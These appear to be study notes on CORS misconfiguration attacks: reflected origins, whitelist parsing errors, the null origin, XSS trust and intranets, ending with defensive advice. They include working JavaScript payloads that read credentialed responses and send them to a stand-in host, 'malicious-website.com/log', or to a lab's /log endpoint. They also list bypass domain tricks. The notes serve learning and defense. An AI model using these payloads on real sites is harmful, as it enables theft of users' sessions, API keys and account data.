**What is CORS (cross-origin resource sharing)?**
Cross-origin resource sharing (CORS) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). However, it also provides potential for cross-domain attacks, if a website's CORS policy is poorly configured and implemented. CORS is not a protection against cross-origin attacks such as cross-site request forgery (CSRF).

**Same-origin policy(SOP)**
The same-origin policy is a restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain. The same-origin policy was defined many years ago in response to potentially malicious cross-domain interactions, such as one website stealing private data from another. It generally allows a domain to issue requests to other domains, but not to access the responses.

**Relaxation of the same-origin policy**
The same-origin policy is very restrictive and consequently various approaches have been devised to circumvent the constraints. Many websites interact with subdomains or third-party sites in a way that requires full cross-origin access. A controlled relaxation of the same-origin policy is possible using cross-origin resource sharing (CORS).
The cross-origin resource sharing protocol uses a suite of HTTP headers that define trusted web origins and associated properties such as whether authenticated access is permitted. These are combined in a header exchange between a browser and the cross-origin web site that it is trying to access.

**Server-generated ACAO header from client-specified Origin header**
Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain.
One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed. For example, consider an application that receives the following request:
```HTTP
GET /sensitive-victim-data HTTP/1.1 
Host: vulnerable-website.com 
Origin: https://malicious-website.com 
Cookie: sessionid=...
```
It then responds with:
```HTTP
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
```

These headers state that access is allowed from the requesting domain (`malicious-website.com`) and that the cross-origin requests can include cookies (`Access-Control-Allow-Credentials: true`) and so will be processed in-session.
Because the application reflects arbitrary origins in the `Access-Control-Allow-Origin` header, this means that absolutely any domain can access resources from the vulnerable domain. If the response contains any sensitive information such as an API key or CSRF token, you could retrieve this by placing the following script on your website:
```javascript
var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://vulnerable-website.com/sensitive-victim-data',true); req.withCredentials = true; 
req.send(); 
function reqListener() { 
location='//malicious-website.com/log?key='+this.responseText; 
};
```
**Errors parsing Origin headers**
Some applications that support access from multiple origins do so by using a whitelist of allowed origins. When a CORS request is received, the supplied origin is compared to the whitelist. If the origin appears on the whitelist then it is reflected in the `Access-Control-Allow-Origin` header so that access is granted. For example, the application receives a normal request like:
```HTTP
GET /data HTTP/1.1 
Host: normal-website.com ... 
Origin: https://innocent-website.com
```
The application checks the supplied origin against its list of allowed origins and, if it is on the list, reflects the origin as follows:
```HTTP
HTTP/1.1 200 OK ... 
Access-Control-Allow-Origin: https://innocent-website.com
```
Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.
For example, suppose an application grants access to all domains ending in:
`normal-website.com`
An attacker might be able to gain access by registering the domain:
`hackersnormal-website.com`
Alternatively, suppose an application grants access to all domains beginning with
`normal-website.com`
An attacker might be able to gain access using the domain:
`normal-website.com.evil-user.net`

**Whitelisted null origin value**
The specification for the Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:
- Cross-origin redirects.
- Requests from serialized data.
- Request using the `file:` protocol.
- Sandboxed cross-origin requests.
to send null origin from victim
```html
<iframe 
style="display: none;" 
sandbox="allow-scripts" 
srcdoc=" <script> 
var xhr = new XMLHttpRequest(); 
var url = 'https://0a2900d504c20c69808712ea00ac00ab.web-security-academy.net/accountDetails'; 
xhr.onreadystatechange = 
function() { 
if (xhr.readyState === XMLHttpRequest.DONE) {
 fetch('/log?key=' + escape(xhr.responseText)); 
 } 
 };
  xhr.open('GET', url, true); 
  xhr.withCredentials = true; 
  xhr.send(); 
  </script>" 
> 
</iframe>
```
**Exploiting XSS via CORS trust relationships**
Even "correctly" configured CORS establishes a trust relationship between two origins. If a website trusts an origin that is vulnerable to cross-site scripting (XSS), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.
Given the following request:
```HTTP
GET /api/requestApiKey HTTP/1.1 
Host: vulnerable-website.com 
Origin: https://subdomain.vulnerable-website.com 
Cookie: sessionid=...
```
If the server responds with:
```HTTP
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com 
Access-Control-Allow-Credentials: true
```
Then an attacker who finds an XSS vulnerability on `subdomain.vulnerable-website.com` could use that to retrieve the API key, using a URL like:
`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`

**Breaking TLS with poorly configured CORS**
Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:
```HTTP
GET /api/requestApiKey HTTP/1.1 
Host: vulnerable-website.com 
Origin: http://trusted-subdomain.vulnerable-website.com 
Cookie: sessionid=...
```
The application responds with:
```HTTP
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com Access-Control-Allow-Credentials: true
```
**Intranets and CORS without credentials**
Most CORS attacks rely on the presence of the response header:
`Access-Control-Allow-Credentials: true`
Without that header, the victim user's browser will refuse to send their cookies, meaning the attacker will only gain access to unauthenticated content, which they could just as easily access by browsing directly to the target website.
However, there is one common situation where an attacker can't access a website directly: when it's part of an organization's intranet, and located within private IP address space. Internal websites are often held to a lower security standard than external sites, enabling attackers to find vulnerabilities and gain further access. For example, a cross-origin request within a private network may be as follows:
```HTTP
GET /reader?url=doc1.pdf 
Host: intranet.normal-website.com 
Origin: https://normal-website.com
```
And the server responds with:
```HTTP
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: *
```
The best defense is a strict, server-side allowlist.
- **Never reflect the Origin header.** Do not take the `Origin` header from the request and put it in the `Access-Control-Allow-Origin` response.
- **Use a strict allowlist.** Maintain a list of specific, trusted origins (e.g., `https://app.example.com`, `https://marketing.example.com`) and only return one of those if the request's `Origin` matches.
- **Never use `*` with credentials.** If you must allow credentials (`ACAC: true`), you **must** specify a single, non-wildcard origin in the `ACAO` header.
- **Validate Regex:** If you must use regex to validate subdomains, anchor it properly with `^` and `$` (e.g., `^https://[\w-]+\.example\.com$`).
- **Set `Vary: Origin`:** This header tells caches to store different versions of the response based on the request's `Origin` header, preventing a cached, permissive response from being served to the wrong user.

A "simple request" (no preflight) must meet **all** of these conditions:
- **Method:** `GET`, `POST`, or `HEAD`
- **`Content-Type`:** `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`
- **Headers:** Only standard headers (like `Accept`, `Host`, `User-Agent`, etc.)